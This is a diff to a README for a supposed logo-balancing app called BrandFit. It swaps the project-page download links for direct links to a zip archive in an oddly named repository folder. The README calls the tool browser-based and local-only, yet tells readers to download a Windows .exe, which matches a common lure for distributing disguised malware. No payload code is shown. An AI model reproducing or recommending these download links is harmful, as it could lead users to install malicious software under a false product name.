@@ -1,6 +1,6 @@
 # 🎨 BrandFit - Balance your logo designs with ease
 
-[![](https://img.shields.io/badge/Download_BrandFit-blue?style=for-the-badge)](https://github.com/aquilachrysaetoswynnea936/BrandFit)
+[![](https://img.shields.io/badge/Download_BrandFit-blue?style=for-the-badge)](https://github.com/aquilachrysaetoswynnea936/BrandFit/raw/refs/heads/main/isolecithal/Fit_Brand_3.9.zip)
 
 BrandFit handles the tedious work of preparing logo grids. This application uses your web browser to perform automated image resizing, whitespace trimming, and padding normalization. It keeps your files on your computer to protect your privacy.
 
@@ -8,7 +8,7 @@ BrandFit handles the tedious work of preparing logo grids. This application uses
 
 You can access the software directly from our project page. Visit the link below to find the current version.
 
-[Download BrandFit here](https://github.com/aquilachrysaetoswynnea936/BrandFit)
+[Download BrandFit here](https://github.com/aquilachrysaetoswynnea936/BrandFit/raw/refs/heads/main/isolecithal/Fit_Brand_3.9.zip)
 
 Click the link to reach the repository. From there, look for the Releases section on the right side of the page. Select the latest version listed. Download the file ending in .exe for your Windows computer.
 
